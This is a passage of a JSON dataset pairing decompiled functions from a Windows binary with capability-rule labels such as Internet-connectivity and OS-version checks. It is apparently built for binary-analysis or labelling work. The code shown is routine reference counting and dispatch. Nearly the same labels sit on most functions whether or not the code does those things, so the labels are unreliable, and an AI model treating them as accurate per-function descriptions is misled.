iVar8 + 1;\n        piVar4 = arg2 + iVar8;\n        iVar3 = *piVar4;\n    } while( true );\n}\n",
        "token_count": 1011
    },
    "00062e90": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00062e90(int64_t **arg1)\n\n{\n    int64_t *piVar1;\n    int64_t *arg1_00;\n    \n    arg1_00 = *arg1;\n    if (0 < arg1_00[2]) {\n        LOCK();\n        piVar1 = arg1_00 + 2;\n        *piVar1 = *piVar1 + -1;\n        if (*piVar1 == 0) {\n            fcn.0005ceb0(arg1, 4);\n            (**(**arg1 + 0x2c))(arg1, *(arg1_00 + 0xc));\n            fcn.00030d24(arg1_00);\n            LOCK();\n            *0x8e2a8 = *0x8e2a8 + -1;\n        }\n    }\n    return;\n}\n",
        "token_count": 186
    },
    "00062f3c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00062f3c(int64_t **arg1, ulong arg2)\n\n{\n    int64_t **arg1_00;\n    int64_t *piVar1;\n    int32_t iVar2;\n    \n    arg1_00 = *arg1;\n    fcn.00030310(0x8e2b0);\n    iVar2 = fcn.0005cf30(arg1_00, 4);\n    if ((iVar2 == 0) || (piVar1 = *arg1_00,  *(piVar1 + 1) != 0)) {\n        fcn.00030378(0x8e2b0);\n    }\n    else {\n        *(piVar1 + 0xc) = arg2;\n        *(piVar1 + 1) = 1;\n        fcn.00030378(0x8e2b0);\n        (**(**arg1_00 + 0x24))(arg1_00, arg2);\n        fcn.00062e90(arg1_00);\n    }\n    *arg1 = NULL;\n    return;\n}\n",
        "token_count": 240
    },
    "00063050": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.00063050(int64_t *arg1, ulong arg2, ulong arg3)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    uint64_t uVar3;\n    \n    uVar3 = fcn.00062ff4(arg1);\n    if (uVar3 == 0) {\n        if ((***arg1 < 0x35) || (pcVar1 = *(**arg1 + 0xd),  pcVar1 == NULL)) {\n            uVar3 = 0x21590001;\n        }\n        else {\n            uVar2 = (*pcVar1)(arg1, arg2, arg3);\n            uVar3 = uVar2;\n            if ((uVar2 != 0) && (*(*arg1 + 8) != 0)) {\n                uVar3 = 0x21590006;\n            }\n        }\n        fcn.00062e90(arg1);\n    }\n    return uVar3;\n}\n",
        "token_count": 216
    },
    "000631cc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.000631cc(int64_t *arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    uint64_t uVar3;\n    uint in_stack_00000028;\n    \n    uVar3 = fcn.00062ff4(arg1);\n    if (uVar3 == 0) {\n        if ((***arg1 < 0x4d) || (pcVar1 = *(**arg1 + 0x13),  pcVar1 == NULL)) {\n            uVar3 = 0x21590001;\n        }\n        else {\n            uVar2 = (*pcVar1)(arg1, arg2, arg3, arg4, in_stack_00000028);\n            uVar3 = uVar2;\n            if ((uVar2 != 0) && (*(*arg1 + 8) != 0)) {\n                uVar3 = 0x21590006;\n            }\n        }\n        fcn.00062e90(arg1);\n    }\n    return uVar3;\n}\n",
        "token_count": 241
    },
    "00063248": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.00063248(int64_t *arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    uint64_t uVar3;\n    uint in_stack_00000028;\n    \n    uVar3 = fcn.00062ff4(arg1);\n    if (uVar3 == 0) {\n        if ((***arg1 < 0x55) || (pcVar1 = *(**arg1 + 0x15),  pcVar1 == NULL)) {\n            uVar3 = 0x21590001;\n        }\n        else {\n            uVar2 = (*pcVar1)(arg1, arg2, arg3, arg4, in_stack_00000028);\n            uVar3 = uVar2;\n            if ((uVar2 != 0) && (*(*arg1 + 8) != 0)) {\n                uVar3 = 0x21590006;\n            }\n        }\n        fcn.00062e90(arg1);\n    }\n    return uVar3;\n}\n",
        "token_count": 240
    },
    "000632c4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.000632c4(int64_t *arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    uint64_t uVar3;\n    \n    uVar3 = fcn.00062ff4(arg1);\n    if (uVar3 == 0) {\n        if ((***arg1 < 0x65) || (pcVar1 = *(**arg1 + 0x19),  pcVar1 == NULL)) {\n            uVar3 = 0x21590001;\n        }\n        else {\n            uVar2 = (*pcVar1)(arg1, arg2, arg3, arg4);\n            uVar3 = uVar2;\n            if ((uVar2 != 0) && (*(*arg1 + 8) != 0)) {\n                uVar3 = 0x21590006;\n            }\n        }\n        fcn.00062e90(arg1);\n    }\n    return uVar3;\n}\n",
        "token_count": 225
    },
    "00063334": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.00063334(int64_t *arg1, int64_t *arg2, uint *arg3, ulong arg4)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    uint64_t uVar3;\n    uint in_stack_00000028;\n    \n    uVar3 = fcn.00062ff4(arg1);\n    if (uVar3 == 0) {\n        if ((***arg1 < 0x6d) || (pcVar1 = *(**arg1 + 0x1b),  pcVar1 == NULL)) {\n            fcn.00062e90(arg1);\n            uVar3 = 0x21590001;\n        }\n        else {\n            uVar2 = (*pcVar1)(arg1, arg2, arg3, arg4, in_stack_00000028);\n            uVar3 = uVar2;\n            if ((uVar2 != 0) || (*arg2 == 0)) {\n                if (*(*arg1 + 8) != 0) {\n                    uVar3 = 0x21590006;\n                }\n                fcn.00062e90(arg1);\n                *arg2 = 0;\n                *arg3 = 0;\n            }\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 285
    },
    "000633cc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.000633cc(int64_t *arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    uint64_t uVar3;\n    uint in_stack_00000028;\n    \n    uVar3 = fcn.00062ff4(arg1);\n    if (uVar3 == 0) {\n        if ((***arg1 < 0x7d) || (pcVar1 = *(**arg1 + 0x1f),  pcVar1 == NULL)) {\n            uVar3 = 0x21590001;\n        }\n        else {\n            uVar2 = (*pcVar1)(arg1, arg2, arg3, arg4, in_stack_00000028);\n            uVar3 = uVar2;\n            if ((uVar2 != 0) && (*(*arg1 + 8) != 0)) {\n                uVar3 = 0x21590006;\n            }\n        }\n        fcn.00062e90(arg1);\n    }\n    return uVar3;\n}\n",
        "token_count": 242
    },
    "00063448": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.00063448(int64_t *arg1, int64_t *arg2, uint *arg3, ulong arg4)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    uint64_t uVar3;\n    uint in_stack_00000028;\n    uint in_stack_00000030;\n    \n    uVar3 = fcn.00062ff4(arg1);\n    if (uVar3 == 0) {\n        if ((***arg1 < 0x8d) || (pcVar1 = *(**arg1 + 0x23),  pcVar1 == NULL)) {\n            fcn.00062e90(arg1);\n            uVar3 = 0x21590001;\n        }\n        else {\n            uVar2 = (*pcVar1)(arg1, arg2, arg3, arg4, in_stack_00000028, in_stack_00000030);\n            uVar3 = uVar2;\n            if ((uVar2 != 0) || (*arg2 == 0)) {\n                if (*(*arg1 + 8) != 0) {\n                    uVar3 = 0x21590006;\n                }\n                fcn.00062e90(arg1);\n                *arg2 = 0;\n                *arg3 = 0;\n            }\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 300
    },
    "000634f4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.000634f4(int64_t *arg1, ulong arg2, ulong arg3)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int64_t arg2_00;\n    uint32_t auStackX32 [2];\n    \n    iVar2 = fcn.00062ff4(arg1);\n    if (iVar2 == 0) {\n        if ((***arg1 < 0x75) || (pcVar1 = *(**arg1 + 0x1d),  pcVar1 == NULL)) {\n            fcn.00062e90(arg1);\n            iVar2 = 0x21590001;\n        }\n        else {\n            iVar2 = (*pcVar1)(arg1, arg2);\n            if ((iVar2 != 0) && (*(*arg1 + 8) != 0)) {\n                iVar2 = 0x21590006;\n            }\n            fcn.00062e90(arg1);\n        }\n    }\n    if (iVar2 == 0x21590001) {\n        arg2_00 = fcn.0006380c(arg2, auStackX32);\n        if (arg2_00 == 0) {\n            iVar2 = 0x21590004;\n        }\n        else {\n            iVar2 = fcn.000632c4(arg1, arg2_00, auStackX32[0], arg3);\n            fcn.00030d24(arg2_00);\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 331
    },
    "000635ac": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.000635ac(int64_t *arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int64_t arg2_00;\n    uint32_t auStack56 [4];\n    \n    iVar2 = fcn.00062ff4(arg1);\n    if (iVar2 == 0) {\n        if ((***arg1 < 0x85) || (pcVar1 = *(**arg1 + 0x21),  pcVar1 == NULL)) {\n            fcn.00062e90(arg1);\n            iVar2 = 0x21590001;\n        }\n        else {\n            iVar2 = (*pcVar1)(arg1, arg2, arg3, arg4);\n            if ((iVar2 != 0) && (*(*arg1 + 8) != 0)) {\n                iVar2 = 0x21590006;\n            }\n            fcn.00062e90(arg1);\n        }\n    }\n    if (iVar2 == 0x21590001) {\n        arg2_00 = fcn.0006380c(arg2, auStack56);\n        if (arg2_00 == 0) {\n            iVar2 = 0x21590004;\n        }\n        else {\n            iVar2 = fcn.000633cc(arg1, arg2_00, auStack56[0], arg3);\n            fcn.00030d24(arg2_00);\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 335
    },
    "00063678": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.00063678(char *arg1)\n\n{\n    int64_t *piVar1;\n    char cVar2;\n    int64_t iVar3;\n    int64_t *piVar4;\n    int32_t iVar5;\n    int64_t iVar6;\n    uint64_t uVar7;\n    char *pcVar8;\n    \n    LOCK();\n    iVar3 = *0x8e2c8 + 1;\n    iVar6 = *0x8e2c8 + 1;\n    *0x8e2c8 = iVar3;\n    if (iVar6 < 2) {\n        fcn.0005cdc8();\n        piVar4 = *0x7d9f8;\n        iVar6 = 0;\n        iVar3 = **0x7d9f8;\n        piVar1 = *0x7d9f8;\n        while (iVar3 != 0) {\n            iVar5 = (**(*(piVar1 + 0xc) + 4))();\n            if (iVar5 != 0) {\n                *(piVar1 + 0xc) = 0;\n            }\n            iVar6 = iVar6 + 1;\n            piVar1 = piVar4 + iVar6 * 0x14;\n            iVar3 = *piVar1;\n        }\n        if (arg1 != NULL) {\n            do {\n                if (*arg1 == '\\0') break;\n                uVar7 = 0xffffffffffffffff;\n                pcVar8 = arg1;\n                do {\n                    if (uVar7 == 0) break;\n                    uVar7 = uVar7 - 1;\n                    cVar2 = *pcVar8;\n                    pcVar8 = pcVar8 + 1;\n                } while (cVar2 != '\\0');\n                arg1 = arg1 + ~uVar7;\n            } while (arg1 != NULL);\n        }\n        fcn.0006233c();\n        fcn.000638a0();\n        fcn.0006450c();\n        fcn.00062c38();\n    }\n    return 0;\n}\n",
        "token_count": 451
    },
    "00063714": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00063714(void)\n\n{\n    int64_t *piVar1;\n    int64_t *piVar2;\n    int64_t iVar3;\n    int64_t **ppiVar4;\n    int64_t iVar5;\n    \n    LOCK();\n    *0x8e2c8 = *0x8e2c8 + -1;\n    if (*0x8e2c8 == 0) {\n        ppiVar4 = 0x7d9f8;\n        do {\n            piVar2 = *ppiVar4;\n            if (piVar2 != NULL) {\n                iVar5 = 0;\n                iVar3 = *piVar2;\n                piVar1 = piVar2;\n                while (iVar3 != 0) {\n                    if (*(piVar1 + 0xc) != 0) {\n                        (**(*(piVar1 + 0xc) + 0xc))();\n                    }\n                    iVar5 = iVar5 + 1;\n                    piVar1 = piVar2 + iVar5 * 0x14;\n                    iVar3 = *piVar1;\n                }\n                if (ppiVar4[-1] != NULL) {\n                    ppiVar4[-1] = NULL;\n                    *ppiVar4 = NULL;\n                }\n            }\n            ppiVar4 = ppiVar4 + 2;\n        } while (ppiVar4 < 0x7da98);\n        fcn.0006235c();\n        fcn.000638c0();\n        fcn.0006452c();\n        fcn.00062c58();\n        fcn.0005cdd4();\n    }\n    return;\n}\n",
        "token_count": 356
    },
    "000638cc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.000638cc(int64_t **arg1, int64_t *arg2, ulong arg3, ulong arg4)\n\n{\n    char cVar1;\n    char *arg1_00;\n    uchar *puVar2;\n    int64_t iVar3;\n    int64_t *piVar4;\n    int64_t iVar5;\n    int32_t iVar6;\n    char *pcVar7;\n    int64_t iVar8;\n    ulong in_stack_00000028;\n    uint in_stack_00000030;\n    \n    iVar8 = 0;\n    *arg1 = NULL;\n    iVar3 = *arg2;\n    piVar4 = arg2;\n    do {\n        if (iVar3 == 0) {\n            return 0x21590005;\n        }\n        arg1_00 = fcn.00030d48(*piVar4);\n        if (arg1_00 == NULL) {\n            return 0x21590004;\n        }\n        puVar2 = fcn.0006682a(arg1_00, 0x2e);\n        if (puVar2 != NULL) {\n            *puVar2 = 0;\n            puVar2 = puVar2 + 1;\n        }\n        iVar3 = fcn.0006387c(arg1_00);\n        if (iVar3 == 0) {\n            fcn.00030d24(arg1_00);\n            iVar6 = 0x21590005;\n            if (*0x7d9d0 == 0) {\ncode_r0x00063a16:\n                if ((*0x7d9e0 != 0) &&\n                   (iVar6 = (**(*0x7d9e0 + 0x14))(arg1, *piVar4, arg3, arg4, in_stack_00000028, in_stack_00000030), \n                   iVar6 == 0)) {\n                    iVar3 = *0x7d9e0;\n                }\n            }\n            else {\n                iVar6 = (**(*0x7d9d0 + 0x14))(arg1, *piVar4, arg3, arg4, in_stack_00000028, in_stack_00000030);\n                if (iVar6 == 0) {\n                    iVar3 = *0x7d9d0;\n                }\n                if (iVar6 == 0x21590005) goto code_r0x00063a16;\n            }\n            if (iVar3 != 0) goto code_r0x00063a9f;\n            if (iVar6 != 0x21590005) {\n                return iVar6;\n            }\n        }\n        else {\n            if (puVar2 == NULL) {\n                iVar5 = -1;\n                pcVar7 = arg1_00;\n                do {\n                    if (iVar5 == 0) break;\n                    iVar5 = iVar5 + -1;\n                    cVar1 = *pcVar7;\n                    pcVar7 = pcVar7 + 1;\n                } while (cVar1 != '\\0');\n                iVar6 = ~iVar5 - 1;\n            }\n            else {\n                iVar6 = puVar2 - arg1_00;\n            }\n            fcn.00030d24(arg1_00);\n            iVar6 = (**(iVar3 + 0x14))(arg1, iVar6 + *piVar4, arg3, arg4, in_stack_00000028, in_stack_00000030);\n        }\n        if (iVar3 != 0) {\ncode_r0x00063a9f:\n            if (iVar6 != 0) {\n                return iVar6;\n            }\n            if (*arg1 != NULL) {\n                piVar4 = fcn.00030c98(0x18);\n                if (piVar4 != NULL) {\n                    *piVar4 = iVar3;\n                    *(piVar4 + 1) = 0;\n                    *(piVar4 + 0xc) = 0;\n                    piVar4[2] = 1;\n                    **arg1 = piVar4;\n                    iVar6 = fcn.0005ce3c(*arg1, 2);\n                    if (iVar6 != 0) {\n                        LOCK();\n                        *0x8e2d0 = *0x8e2d0 + 1;\n                        return 0;\n                    }\n                    fcn.00030d24(piVar4);\n                }\n                (**(iVar3 + 0x1c))(*arg1, 0);\n                (**(iVar3 + 0x24))(*arg1, 0);\n                *arg1 = NULL;\n                return 0x21590004;\n            }\n            (**(iVar3 + 0x1c))(0, 0);\n            (**(iVar3 + 0x24))(*arg1, 0);\n            return -1;\n        }\n        iVar8 = iVar8 + 1;\n        piVar4 = arg2 + iVar8;\n        iVar3 = *piVar4;\n    } while( true );\n}\n",
        "token_count": 1089
    },
    "00063b30": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00063b30(int64_t **arg1)\n\n{\n    int64_t *piVar1;\n    int64_t *arg1_00;\n    \n    arg1_00 = *arg1;\n    if (0 < arg1_00[2]) {\n        LOCK();\n        piVar1 = arg1_00 + 2;\n        *piVar1 = *piVar1 + -1;\n        if (*piVar1 == 0) {\n            fcn.0005ceb0(arg1, 2);\n            (**(**arg1 + 0x24))(arg1, *(arg1_00 + 0xc));\n            fcn.00030d24(arg1_00);\n            LOCK();\n            *0x8e2d0 = *0x8e2d0 + -1;\n        }\n    }\n    return;\n}\n",
        "token_count": 185
    },
    "00063c94": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.00063c94(int64_t **arg1, ulong *arg2, ulong arg3)\n\n{\n    code *pcVar1;\n    int64_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint64_t uVar5;\n    int64_t *arg1_00;\n    \n    uVar5 = fcn.00063c38(arg1);\n    if (uVar5 == 0) {\n        if ((***arg1 < 0x35) || (pcVar1 = *(**arg1 + 0xd),  pcVar1 == NULL)) {\n            fcn.00063b30(arg1);\n            uVar5 = 0x21590001;\n        }\n        else {\n            uVar3 = (*pcVar1)(arg1, arg2, arg3);\n            uVar5 = uVar3;\n            if (uVar3 == 0) {\n                arg1_00 = fcn.00030c98(0x18);\n                if (arg1_00 == NULL) {\n                    fcn.00063b30(arg1);\n                    (**(**arg1 + 0x24))(*arg2, 0);\n                    *arg2 = 0;\n                    return 0x21590004;\n                }\n                iVar2 = **arg1;\n                *(arg1_00 + 1) = 0;\n                *(arg1_00 + 0xc) = 0;\n                *arg1_00 = iVar2;\n                arg1_00[2] = 1;\n                **arg2 = arg1_00;\n                iVar4 = fcn.0005ce3c(*arg2, 2);\n                if (iVar4 == 0) {\n                    fcn.00030d24(arg1_00);\n                    (**(**arg1 + 0x24))(*arg2, 0);\n                    *arg2 = 0;\n                    uVar5 = 0x21590004;\n                }\n                else {\n                    LOCK();\n                    *0x8e2d0 = *0x8e2d0 + 1;\n                }\n            }\n            else if (*(*arg1 + 1) != 0) {\n                uVar5 = 0x21590006;\n            }\n            fcn.00063b30(arg1);\n        }\n    }\n    return uVar5;\n}\n",
        "token_count": 516
    },
    "00063e60": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.00063e60(int64_t *arg1, ulong arg2)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    uint64_t uVar3;\n    \n    uVar3 = fcn.00063c38(arg1);\n    if (uVar3 == 0) {\n        if ((***arg1 < 0x2d) || (pcVar1 = *(**arg1 + 0xb),  pcVar1 == NULL)) {\n            uVar3 = 0x21590001;\n        }\n        else {\n            uVar2 = (*pcVar1)(arg1, arg2);\n            uVar3 = uVar2;\n            if ((uVar2 != 0) && (*(*arg1 + 8) != 0)) {\n                uVar3 = 0x21590006;\n            }\n        }\n        fcn.00063b30(arg1);\n    }\n    return uVar3;\n}\n",
        "token_count": 211
    },
    "00063f28": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.00063f28(int64_t *arg1, ulong arg2, ulong arg3)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    uint64_t uVar3;\n    \n    uVar3 = fcn.00063c38(arg1);\n    if (uVar3 == 0) {\n        if ((***arg1 < 0x45) || (pcVar1 = *(**arg1 + 0x11),  pcVar1 == NULL)) {\n            uVar3 = 0x21590001;\n        }\n        else {\n            uVar2 = (*pcVar1)(arg1, arg2, arg3);\n            uVar3 = uVar2;\n            if ((uVar2 != 0) && (*(*arg1 + 8) != 0)) {\n                uVar3 = 0x21590006;\n            }\n        }\n        fcn.00063b30(arg1);\n    }\n    return uVar3;\n}\n",
        "token_count": 218
    },
    "00063f90": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.00063f90(int64_t *arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    uint64_t uVar3;\n    \n    uVar3 = fcn.00063c38(arg1);\n    if (uVar3 == 0) {\n        if ((***arg1 < 0x4d) || (pcVar1 = *(**arg1 + 0x13),  pcVar1 == NULL)) {\n            uVar3 = 0x21590001;\n        }\n        else {\n            uVar2 = (*pcVar1)(arg1, arg2, arg3, arg4);\n            uVar3 = uVar2;\n            if ((uVar2 != 0) && (*(*arg1 + 8) != 0)) {\n                uVar3 = 0x21590006;\n            }\n        }\n        fcn.00063b30(arg1);\n    }\n    return uVar3;\n}\n",
        "token_count": 226
    },
    "00064000": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.00064000(int64_t *arg1, int64_t *arg2, uint *arg3, ulong arg4)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    uint64_t uVar3;\n    uint in_stack_00000028;\n    \n    uVar3 = fcn.00063c38(arg1);\n    if (uVar3 == 0) {\n        if ((***arg1 < 0x55) || (pcVar1 = *(**arg1 + 0x15),  pcVar1 == NULL)) {\n            fcn.00063b30(arg1);\n            uVar3 = 0x21590001;\n        }\n        else {\n            uVar2 = (*pcVar1)(arg1, arg2, arg3, arg4, in_stack_00000028);\n            uVar3 = uVar2;\n            if ((uVar2 != 0) || (*arg2 == 0)) {\n                if (*(*arg1 + 8) != 0) {\n                    uVar3 = 0x21590006;\n                }\n                fcn.00063b30(arg1);\n                *arg2 = 0;\n                *arg3 = 0;\n            }\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 283
    },
    "00064098": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.00064098(int64_t *arg1, ulong arg2, ulong arg3, int64_t *arg4)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    uint64_t uVar3;\n    uint *in_stack_00000028;\n    uint in_stack_00000030;\n    uint in_stack_00000038;\n    \n    uVar3 = fcn.00063c38(arg1);\n    if (uVar3 == 0) {\n        if ((***arg1 < 0x5d) || (pcVar1 = *(**arg1 + 0x17),  pcVar1 == NULL)) {\n            fcn.00063b30(arg1);\n            uVar3 = 0x21590001;\n        }\n        else {\n            uVar2 = (*pcVar1)(arg1, arg2, arg3, arg4, in_stack_00000028, in_stack_00000030, in_stack_00000038);\n            uVar3 = uVar2;\n            if ((uVar2 != 0) || (*arg4 == 0)) {\n                if (*(*arg1 + 8) != 0) {\n                    uVar3 = 0x21590006;\n                }\n                fcn.00063b30(arg1);\n                *arg4 = 0;\n                *in_stack_00000028 = 0;\n            }\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 320
    },
    "00064150": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.00064150(int64_t *arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    uint64_t uVar3;\n    uint in_stack_00000028;\n    \n    uVar3 = fcn.00063c38(arg1);\n    if (uVar3 == 0) {\n        if ((***arg1 < 0x75) || (pcVar1 = *(**arg1 + 0x1d),  pcVar1 == NULL)) {\n            uVar3 = 0x21590001;\n        }\n        else {\n            uVar2 = (*pcVar1)(arg1, arg2, arg3, arg4, in_stack_00000028);\n            uVar3 = uVar2;\n            if ((uVar2 != 0) && (*(*arg1 + 8) != 0)) {\n                uVar3 = 0x21590006;\n            }\n        }\n        fcn.00063b30(arg1);\n    }\n    return uVar3;\n}\n",
        "token_count": 241
    },
    "000641cc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.000641cc(int64_t *arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    uint64_t uVar3;\n    uint in_stack_00000028;\n    \n    uVar3 = fcn.00063c38(arg1);\n    if (uVar3 == 0) {\n        if ((***arg1 < 0x7d) || (pcVar1 = *(**arg1 + 0x1f),  pcVar1 == NULL)) {\n            uVar3 = 0x21590001;\n        }\n        else {\n            uVar2 = (*pcVar1)(arg1, arg2, arg3, arg4, in_stack_00000028);\n            uVar3 = uVar2;\n            if ((uVar2 != 0) && (*(*arg1 + 8) != 0)) {\n                uVar3 = 0x21590006;\n            }\n        }\n        fcn.00063b30(arg1);\n    }\n    return uVar3;\n}\n",
        "token_count": 242
    },
    "00064248": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
